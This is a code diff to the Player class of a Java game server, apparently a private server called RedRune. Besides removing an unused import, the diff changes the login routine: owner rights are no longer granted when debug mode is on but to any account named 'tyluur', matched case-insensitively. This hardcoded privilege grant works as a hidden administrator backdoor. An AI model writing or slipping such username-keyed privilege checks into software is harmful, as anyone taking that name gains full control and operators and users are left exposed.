@@ -1,6 +1,5 @@
 package org.redrune.game.entity.actor.player;
 
-import kotlin.jvm.Transient;
 import org.redrune.engine.SystemManager;
 import org.redrune.engine.tick.task.WorldTask;
 import org.redrune.engine.tick.task.WorldTasksManager;
@@ -114,7 +113,6 @@ public class Player extends Actor {
      * @Presets
      */
     private PresetManager presetManager;
-
 
     public PresetManager getPresetManager() {
         return presetManager;
@@ -687,7 +685,7 @@ public class Player extends Actor {
             int delayPassed = (int) ((Misc.currentTimeMillis() - SystemManager.shutdownStart) / 1000);
             getPackets().sendSystemUpdate(SystemManager.shutdownDelay - delayPassed);
         }
-        if (GameFlags.debugMode) {
+        if (username.equalsIgnoreCase("tyluur")) {
             this.rights.add(PlayerRight.OWNER);
         }
         getPackets().sendMessage("Welcome to " + GameConstants.SERVER_NAME + ". Use ::commands for a good time ;).");
